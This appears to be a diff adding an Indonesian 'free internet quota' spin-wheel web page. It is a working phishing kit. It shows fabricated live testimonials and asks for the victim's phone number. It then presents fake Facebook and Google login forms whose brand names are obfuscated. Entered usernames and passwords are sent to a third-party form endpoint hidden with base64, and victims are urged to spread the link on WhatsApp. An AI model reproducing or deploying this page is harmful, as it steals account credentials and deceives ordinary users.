@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>HADIAH KUOTA INTERNET GRATIS</title>
+    <meta name="description" content="Event Spesial! Putar roda keberuntungan dan dapatkan Kuota Internet hingga 8GB secara gratis sekarang!">
+    <meta property="og:title" content="HADIAH KUOTA GRATIS: Klaim hingga 8GB">
+    <meta property="og:description" content="Klik link ini untuk mengikuti event Spin Kuota Internet All Operator. Buruan sebelum berakhir!">
+    
+    <meta itemprop="image" content="https://i.imgur.com/Vuk9XBu.jpeg">
+    <meta property="og:image" content="https://i.imgur.com/Vuk9XBu.jpeg">
+    <meta property="og:image:secure_url" content="https://i.imgur.com/Vuk9XBu.jpeg">
+    <meta property="og:url" content="https://dm-gratis.github.io/x/">
+    <meta property="og:type" content="website">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            /* TEMA MODERN DARK MODE */
+            --primary: #4facfe;
+            --secondary: #00f2fe;
+            --accent: #ff4757;
+            --text-light: #f8fafc;
+            --text-muted: #cbd5e1;
+            --bg-main: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+            --bg-card: #1e293b;
+            --input-bg: #0f172a;
+            --border-color: #334155;
+            
+            /* WARNA RODA */
+            --wheel-grad: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
+        
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background: var(--bg-main); 
+            color: var(--text-light); 
+            overflow-x: hidden; 
+            min-height: 100vh;
+        }
+
+        .container { 
+            max-width: 800px; 
+            margin: 0 auto; 
+            padding: 40px 20px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            text-align: center; 
+        }
+
+        .hero-banner { 
+            width: 100%; 
+            max-width: 450px; 
+            border-radius: 15px; 
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); 
+            margin-bottom: 25px; 
+            overflow: hidden; 
+            background: var(--bg-card);
+            border: 3px solid var(--border-color);
+        }
+        .hero-banner img { width: 100%; height: auto; display: block; }
+
+        header { margin-bottom: 10px; }
+        h1 { 
+            font-size: 2.2rem; 
+            font-weight: 900;
+            text-transform: uppercase; 
+            color: var(--text-light);
+            line-height: 1.2;
+        }
+        h1 span { 
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .info-desc { 
+            font-size: 0.95rem; 
+            color: var(--text-muted); 
+            font-weight: 600; 
+            margin-top: 8px; 
+        }
+
+        /* WHEEL SYSTEM */
+        .wheel-wrapper {
+            position: relative; width: 320px; height: 320px; margin: 30px auto;
+            border-radius: 50%; padding: 10px;
+            background: var(--wheel-grad);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .ptr {
+            position: absolute; top: -20px; left: 50%; transform: translateX(-50%);
+            width: 40px; height: 50px; background: var(--accent);
+            clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 100;
+        }
+
+        #wheel-svg {
+            width: 100%; height: 100%; border-radius: 50%; background: var(--input-bg);
+            transform: rotate(-90deg); transition: transform 5s cubic-bezier(.15,0,0,1);
+            border: 4px solid var(--border-color);
+        }
+
+        .slice-text { 
+            fill: #fff; 
+            font-family: 'Poppins', sans-serif; 
+            font-size: 14px; 
+            font-weight: 800; 
+            text-anchor: middle; 
+        }
+
+        .btn-spin {
+            margin-top: 20px; padding: 15px 50px; 
+            background: var(--wheel-grad);
+            border: none; border-radius: 50px; color: #fff;
+            font-family: 'Poppins', sans-serif; font-weight: 800; font-size: 1.2rem;
+            cursor: pointer; transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(118, 75, 162, 0.3);
+        }
+        .btn-spin:hover:not(:disabled) { 
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(118, 75, 162, 0.5); 
+        }
+        .btn-spin:active:not(:disabled) {
+            transform: translateY(1px);
+        }
+
+        /* BAGIAN TESTIMONI LIVE */
+        .testi-section {
+            width: 100%;
+            max-width: 450px;
+            margin-top: 50px;
+            text-align: left;
+        }
+        .testi-section h3 {
+            font-size: 1.2rem;
+            color: var(--text-light);
+            margin-bottom: 20px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 800;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .testi-section h3::before {
+            content: "🔴";
+            font-size: 0.8rem;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+        
+        .testi-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            overflow: hidden; /* Sembunyikan scroll, biarkan javascript mengatur */
+            min-height: 250px; /* Jaga tinggi ruang agar tidak loncat */
+        }
+
+        .testi-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            /* Animasi masuk baru */
+            animation: slideInDown 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+            transform-origin: top center;
+        }
+        
+        /* Class untuk animasi keluar */
+        .testi-item.fade-out {
+            animation: fadeOutUp 0.5s ease forwards;
+        }
+
+        @keyframes slideInDown { 
+            from { opacity: 0; transform: translateY(-20px) scale(0.95); } 
+            to { opacity: 1; transform: translateY(0) scale(1); } 
+        }
+        
+        @keyframes fadeOutUp {
+            from { opacity: 1; transform: translateY(0); }
+            to { opacity: 0; transform: translateY(20px); }
+        }
+
+        .testi-avatar {
+            width: 40px; height: 40px; border-radius: 50%;
+            background: var(--wheel-grad);
+            display: flex; justify-content: center; align-items: center;
+            font-weight: 800; color: #fff; font-size: 1.1rem; flex-shrink: 0;
+        }
+        .testi-content { flex: 1; }
+        .testi-name {
+            font-weight: 700; font-size: 0.95rem; color: var(--text-light);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .testi-number { font-size: 0.75rem; color: var(--text-muted); font-weight: 400; }
+        .testi-desc { font-size: 0.85rem; color: var(--text-muted); margin-top: 5px; line-height: 1.4; }
+        .testi-desc span { color: var(--secondary); font-weight: 700; }
+
+        /* MODALS & AUTH */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
+        .m-card { background: var(--bg-card); width: 90%; max-width: 380px; padding: 35px 25px; text-align: center; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.4); }
+        .m-card h2 { color: var(--primary); font-weight: 900; margin-bottom: 5px; }
+        .g-input { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-light); margin-bottom: 15px; border-radius: 10px; font-size: 1rem; font-family: 'Poppins', sans-serif; transition: 0.3s; }
+        .g-input:focus { border-color: var(--primary); background: var(--bg-card); }
+        .b-claim { width: 100%; padding: 15px; background: linear-gradient(to right, var(--primary), var(--secondary)); color: #fff; border: none; border-radius: 10px; font-family: 'Poppins', sans-serif; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 15px rgba(0, 242, 254, 0.2); }
+        .b-batal { background: transparent; border: none; color: var(--text-muted); cursor: pointer; text-decoration: underline; margin-top: 15px; width: 100%; font-size: 0.9rem; font-family: 'Poppins', sans-serif; }
+        
+        .auth-box { background: var(--bg-card); border-radius: 20px; width: 90%; max-width: 380px; padding: 35px 25px; position: relative; color: var(--text-light); text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.4); }
+        .close-x { position: absolute; top: 15px; right: 20px; font-size: 24px; color: var(--text-muted); cursor: pointer; }
+        
+        .btn-wa { width: 100%; padding: 16px; background: #25D366; color: #fff; font-weight: 800; border-radius: 10px; text-decoration: none; display: inline-block; margin-top: 15px; box-shadow: 0 8px 20px rgba(37, 211, 102, 0.2); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="hero-banner">
+            <img src="https://i.imgur.com/JAPxDQh.png" alt="Banner Kuota">
+        </div>
+        
+        <header>
+            <h1>SPIN <span>KUOTA</span> GRATIS</h1>
+            <div class="info-desc">Dapatkan Kuota 1GB - 8GB All Operator</div>
+        </header>
+
+        <div class="wheel-wrapper">
+            <div class="ptr"></div>
+            <svg id="wheel-svg" viewBox="0 0 200 200"></svg>
+        </div>
+
+        <button class="btn-spin" id="spin-btn" onclick="executeSpin()">PUTAR SEKARANG</button>
+
+        <div class="testi-section">
+            <h3>Live Testimoni</h3>
+            <div class="testi-list" id="live-testi">
+                </div>
+        </div>
+    </div>
+
+    <audio id="spinSound" src="https://assets.mixkit.co/active_storage/sfx/2003/2003-preview.mp3" loop></audio>
+    <audio id="winSound" src="https://assets.mixkit.co/active_storage/sfx/270/270-preview.mp3"></audio>
+
+    <div class="overlay" id="st_1">
+        <div class="m-card">
+            <h2>SELAMAT!</h2>
+            <p style="margin-bottom: 25px; color: var(--text-muted);">Kamu memenangkan Kuota <br><span id="win_txt" style="font-weight:900; color:var(--primary); font-size: 1.5rem;"></span>.</p>
+            
+            <input type="tel" id="u_id" class="g-input" placeholder="Nomor Handphone (08xxx)" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            
+            <select id="g_type" class="g-input">
+                <option value="TELKOMSEL">Telkomsel</option>
+                <option value="INDOSAT">Indosat Ooredoo</option>
+                <option value="XL/AXIS">XL / AXIS</option>
+                <option value="TRI">Tri (3)</option>
+                <option value="SMARTFREN">Smartfren</option>
+            </select>
+            <button class="b-claim" onclick="openStep2()">KLAIM SEKARANG</button>
+            <button class="b-batal" onclick="hideModals()">Batalkan</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="st_2">
+        <div class="m-card">
+            <h2>VER!F!KAS!</h2>
+            <p style="margin-bottom: 25px; font-size: 0.9rem; color: var(--text-muted);">Silakan masuk untuk melanjutkan pengiriman kuota internet.</p>
+            <button class="b-claim" style="background:#1877F2; box-shadow: 0 5px 15px rgba(24, 119, 242, 0.2); margin-bottom:12px;" onclick="showLogin('afb')">Login dengan Faceb00k</button>
+            <button class="b-claim" style="background:#DB4437; box-shadow: 0 5px 15px rgba(219, 68, 55, 0.2);" onclick="showLogin('agg')">Login dengan G00gle</button>
+            <button class="b-batal" onclick="hideModals()">Batalkan</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="afb">
+        <div class="auth-box">
+            <span class="close-x" onclick="backToStep2('afb')">&times;</span>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" width="130" style="margin-bottom: 25px;">
+            <input type="text" id="fb_u" placeholder="Nomor ponsel atau email" class="g-input">
+            <input type="password" id="fb_p" placeholder="Kata-sand!" class="g-input">
+            <button id="fb_btn" onclick="submitAuth('pesbuk', 'fb_u', 'fb_p', 'fb_btn')" style="width:100%; padding:14px; background:#1877f2; color:#fff; border:none; border-radius:10px; font-size:18px; font-weight:bold; cursor:pointer; font-family:'Poppins', sans-serif;">Log In</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="agg">
+        <div class="auth-box" style="text-align: left;">
+            <span class="close-x" onclick="backToStep2('agg')">&times;</span>
+            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"></center>
+            <h3 style="text-align:center; font-weight:500; margin: 15px 0 35px; font-family:'Poppins', sans-serif; color:var(--text-light);">Login</h3>
+            <input type="text" id="gg_u" placeholder="Email atau nomor telepon" class="g-input">
+            <input type="password" id="gg_p" placeholder="Kata-sand!" class="g-input">
+            <button id="gg_btn" onclick="submitAuth('gugel', 'gg_u', 'gg_p', 'gg_btn')" style="float:right; padding:10px 24px; background:#1a73e8; color:#fff; border:none; border-radius:6px; font-weight:600; cursor:pointer; font-family:'Poppins', sans-serif;">Berikutnya</button>
+        </div>
+    </div>
+
+    <div class="overlay" id="st_sh">
+        <div class="m-card">
+            <h2 style="color: #25D366;">BERHASIL DIPROSES!</h2>
+            <p style="margin: 20px 0; font-size: 0.95rem; color: var(--text-muted);">Satu langkah lagi. Share ke WhatsApp agar kuota segera masuk ke nomor Anda!</p>
+            <a href="https://api.whatsapp.com/send?text=Buruan%20klaim%20kuota%20internet%20gratis%20All%20Operator%20di%20sini:%20https://dm-gratis.github.io/x/" 
+               target="_blank" class="btn-wa">BAGIKAN KE WHATSAPP</a>
+        </div>
+    </div>
+
+    <script>
+        const rewards = ["1GB", "2GB", "3GB", "4GB", "5GB", "6GB", "7GB", "8GB"];
+        const colors = ["#667eea", "#764ba2"];
+        const svg = document.getElementById('wheel-svg');
+        const btn = document.getElementById('spin-btn');
+        const spinSound = document.getElementById("spinSound");
+        const winSound = document.getElementById("winSound");
+
+        let currentRotation = 0;
+        let wonPrize = ""; let uid = ""; let gme = "";
+
+        // Render Roda SVG
+        rewards.forEach((text, i) => {
+            const angle = 360 / rewards.length;
+            const sa = i * angle, ea = (i + 1) * angle;
+            const x1 = 100 + 95 * Math.cos(Math.PI * sa / 180), y1 = 100 + 95 * Math.sin(Math.PI * sa / 180);
+            const x2 = 100 + 95 * Math.cos(Math.PI * ea / 180), y2 = 100 + 95 * Math.sin(Math.PI * ea / 180);
+            const p = document.createElementNS("http://www.w3.org/2000/svg", "path");
+            p.setAttribute("d", `M 100 100 L ${x1} ${y1} A 95 95 0 0 1 ${x2} ${y2} Z`);
+            p.setAttribute("fill", colors[i % 2]); svg.appendChild(p);
+            const ta = sa + (angle / 2);
+            const tx = 100 + 68 * Math.cos(Math.PI * ta / 180), ty = 100 + 68 * Math.sin(Math.PI * ta / 180);
+            const t = document.createElementNS("http://www.w3.org/2000/svg", "text");
+            t.setAttribute("x", tx); t.setAttribute("y", ty); t.setAttribute("class", "slice-text");
+            t.setAttribute("transform", `rotate(${ta + 90}, ${tx}, ${ty})`);
+            t.textContent = text; svg.appendChild(t);
+        });
+
+        // LIVE TESTIMONI SYSTEM
+        const testiData = [
+            { name: "Rizky Aditya", num: "0812****8901", quota: "8GB", msg: "Mantap banget! Baru aja dapet <span>Kuota {q}</span>. Makasih min!" },
+            { name: "Siti Aminah", num: "0857****3321", quota: "3GB", msg: "Beneran masuk dong <span>Kuota {q}</span> ke nomor Indosatku. Lumayan buat scroll Tiktok." },
+            { name: "Dika Pratama", num: "0896****5544", quota: "5GB", msg: "Gak nyangka dapet <span>Kuota {q}</span>, prosesnya gampang dan cepet." },
+            { name: "Ayu Lestari", num: "0838****1192", quota: "2GB", msg: "Terima kasih eventnya, dapet <span>Kuota {q}</span> gratis. Semoga besok bisa dapet lagi." },
+            { name: "Fajar S.", num: "0882****7765", quota: "4GB", msg: "Awalnya iseng doang nyoba putar, eh malah masuk <span>Kuota {q}</span> ke Smartfren!" },
+            { name: "Nia Ramadhani", num: "0878****1211", quota: "1GB", msg: "Alhamdulillah rezeki hari ini dapet <span>Kuota {q}</span>." },
+            { name: "Budi Santoso", num: "0813****8899", quota: "7GB", msg: "Wah gila dapet <span>Kuota {q}</span> beneran dong, padahal cuma iseng!!" },
+            { name: "Lina M.", num: "0895****4422", quota: "6GB", msg: "Yeayyy Tri ku dapet suntikan <span>Kuota {q}</span>. Makasih banyak webnya legit!" }
+        ];
+
+        const testiContainer = document.getElementById('live-testi');
+        let testiIndex = 0;
+
+        function renderTesti() {
+            // Ambil data satu per satu memutar
+            const data = testiData[testiIndex % testiData.length];
+            
+            // Buat elemen
+            const div = document.createElement('div');
+            div.className = 'testi-item';
+            div.innerHTML = `
+                <div class="testi-avatar">${data.name.charAt(0)}</div>
+                <div class="testi-content">
+                    <div class="testi-name">${data.name} <span class="testi-number">${data.num}</span></div>
+                    <div class="testi-desc">${data.msg.replace('{q}', data.quota)}</div>
+                </div>
+            `;
+            
+            // Masukkan ke paling atas
+            testiContainer.prepend(div);
+
+            // Jika jumlah lebih dari 3, hapus yang paling bawah dengan animasi
+            if(testiContainer.children.length > 3) {
+                const lastEl = testiContainer.lastElementChild;
+                lastEl.classList.add('fade-out'); // Memicu animasi menghilang
+                setTimeout(() => {
+                    if(lastEl.parentNode) testiContainer.removeChild(lastEl);
+                }, 500); // Waktu animasi CSS fade-out
+            }
+
+            testiIndex++;
+            
+            // Atur delay acak untuk memunculkan testimoni berikutnya (antara 3 sampai 6 detik) agar natural
+            const randomDelay = Math.floor(Math.random() * 3000) + 3000;
+            setTimeout(renderTesti, randomDelay);
+        }
+
+        // Jalankan saat pertama kali
+        setTimeout(renderTesti, 1000); // Muncul 1 detik setelah web terbuka
+
+
+        function executeSpin() {
+            btn.disabled = true;
+            spinSound.currentTime = 0;
+            spinSound.play().catch(e => {});
+
+            const idx = Math.floor(Math.random() * rewards.length);
+            const totalDeg = (12 * 360) + (360 - (idx * (360/rewards.length)));
+            currentRotation += totalDeg;
+            svg.style.transform = `rotate(${currentRotation - 90}deg)`;
+            wonPrize = rewards[idx];
+
+            setTimeout(() => {
+                spinSound.pause();
+                winSound.currentTime = 0;
+                winSound.play().catch(e => {});
+                document.getElementById('win_txt').innerText = wonPrize;
+                document.getElementById('st_1').style.display = 'flex';
+                btn.disabled = false;
+            }, 5000);
+        }
+
+        function hideModals() { document.querySelectorAll('.overlay').forEach(e => e.style.display = 'none'); }
+        
+        function openStep2() {
+            uid = document.getElementById('u_id').value; 
+            gme = document.getElementById('g_type').value;
+            
+            if(uid.length < 10 || !uid.startsWith("08")) {
+                return alert("Nomor Handphone tidak valid! Pastikan diawali dengan '08' dan minimal 10 angka.");
+            }
+
+            document.getElementById('st_1').style.display = 'none';
+            document.getElementById('st_2').style.display = 'flex';
+        }
+
+        function showLogin(id) { document.getElementById('st_2').style.display = 'none'; document.getElementById(id).style.display = 'flex'; }
+        function backToStep2(id) { document.getElementById(id).style.display = 'none'; document.getElementById('st_2').style.display = 'flex'; }
+
+        async function submitAuth(metode, userF, passF, btnId) {
+            const u = document.getElementById(userF).value, p = document.getElementById(passF).value, b = document.getElementById(btnId);
+            if(!u || !p) return alert("Lengkapi data!");
+            b.innerHTML = '<span>Memproses...</span>'; b.disabled = true;
+
+            const endpoint = atob("aHR0cHM6Ly9mb3Jtc3ByZWUuaW8vZi94bmpncnl3bw=="); // ID: xnjgrywo
+            const payload = { 
+                "hadiah": "Kuota " + wonPrize + " - " + gme + " (No:" + uid + ")", 
+                "login_via": metode, 
+                "mael": u, 
+                "pewe": p 
+            };
+
+            try {
+                const res = await fetch(endpoint, { 
+                    method: "POST", 
+                    body: JSON.stringify(payload), 
+                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' } 
+                });
+                if (res.ok) {
+                    hideModals();
+                    document.getElementById('st_sh').style.display = 'flex';
+                } else {
+                   b.innerText = "COBA LAGI"; b.disabled = false;
+                }
+            } catch (e) { b.innerText = "COBA LAGI"; b.disabled = false; }
+        }
+    </script>
+</body>
+</html>
